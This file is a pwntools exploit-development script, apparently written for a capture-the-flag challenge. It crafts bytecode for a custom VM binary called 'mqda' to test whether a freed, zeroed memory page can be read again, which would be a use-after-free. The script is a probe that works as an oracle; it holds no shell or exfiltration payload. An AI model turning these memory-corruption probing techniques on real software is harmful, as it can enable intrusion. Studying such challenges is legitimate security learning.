#!/usr/bin/env python3
"""
UAF via self-zeroing code page:

1. Load code at address A
2. Part of code zeros out address A's data bytes
3. Cleanup frees address A's page
4. Load more code that triggers a new page allocation
5. That new page might reuse the freed memory
6. IP still points to A, executes new data as code!

The trick is that we need to:
- Zero out our own code page AFTER the instruction we're executing
- The zeroing creates all-zero data
- Cleanup frees the page
- We jump to execute from that location again, but it's now freed/reused
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    # mode 2, opcode 1
    return bytes([0x41, reg]) + p32(imm32)

def store_reg_at_addr(addr_reg, val_reg):
    # mode 3, opcode 1: STORE [addr_reg] = val_reg  
    # Encoding: (3 << 5) | 1 = 0x61, then val_reg, then addr_reg
    return bytes([0x61, addr_reg, val_reg])

def jmp_imm(addr):
    # mode 2, opcode 14 (0x0E)
    return bytes([0x4E, 0]) + p32(addr)  # Use reg 0 as temp

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

# Strategy:
# 1. Code at 0x10000 writes zeros to itself and jumps to continuation
# 2. Continuation at 0x10100 allocates new page that might reuse freed 0x10000
# 3. If we can control what goes into that new page...

# Actually, let me think about this more carefully.
# The page at 0x10000 would be freed if all its data bytes 4-0x103 are zero.
# After loading code, those bytes contain our code, not zeros.
# We'd need to overwrite them with zeros via STORE.

# But STORE writes to VM addresses, and we know page[offset+4] = data[offset].
# So storing zero at VM addr 0x10000..0x100FF would zero out the page data.

# The question is: can we zero our code page while still executing from it?
# After zeroing and cleanup, the next instruction fetch would fail or read garbage.

# Let's try:
# 1. Code at 0x10000: writes zeros to 0x10000-0x100FF, then jumps somewhere
# 2. When we execute from zeroed memory, we get HLT (0x00)

code_addr = 0x10000

# We need code that:
# a) Executes some initial instructions
# b) Zeros out the code page (including our own code after the current IP)
# c) Continues or jumps

# Let's place real code at low IP, then zero the REST of the page
# Then after cleanup, if we had a jump back, we'd execute zeros

# Actually simpler: put code in page 0x10000, zero page 0x20000, 
# then read from 0x20000 after it's freed to see if we get stale data

code = b''

# Write some data to 0x20004 (first data byte of page 0x20000)
code += mov_reg_imm(15, 0x20000)  # SP = 0x20000
code += mov_reg_imm(0, 0xDEADBEEF)
code += push_reg(0)  # Writes to page[0+4] = page[4], which is data byte 0

# Now zero out the entire page 0x20000 data bytes
# Data is at page[4..259], so VM addr 0x20000..0x200FF
for i in range(64):  # 64 dwords = 256 bytes
    vm_addr = 0x20000 + i * 4
    sp = vm_addr & 0xFFFF00
    sp |= (vm_addr & 0xFF) - 4
    if (vm_addr & 0xFF) < 4:
        continue  # Skip, use other approach
    code += mov_reg_imm(15, sp)
    code += mov_reg_imm(0, 0)
    code += push_reg(0)

# Page 0x20000 should now be all zeros -> cleanup frees it
# Now try to read from 0x20004 - should get stale or new data
code += mov_reg_imm(15, 0x20000)
code += pop_reg(0)  # Read from page[(0+4)] = data[0]

# Use oracle to check if r0 is still 0xDEADBEEF or something else
code += mov_reg_imm(1, 0xDEADBEEF)
code += bytes([0x2D, 0, 1])  # CMP r0, r1 (mode 1, opcode 13)

# JNE to HLT if equal, ILLEGAL if not equal
jne_addr = code_addr + len(code) + 6 + 2 + 1
code += mov_reg_imm(2, jne_addr)
code += bytes([0x10, 2])  # JNE to HLT addr
code += bytes([0xFF])     # ILLEGAL - value changed
code += hlt()             # TERMINATED - value same

print(f"[*] Code length: {len(code)} bytes")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

if b'TERMINATED' in output:
    print("[*] Value unchanged - no UAF or page still allocated")
else:
    print("[+] Value changed or error - potential UAF!")

p.close()
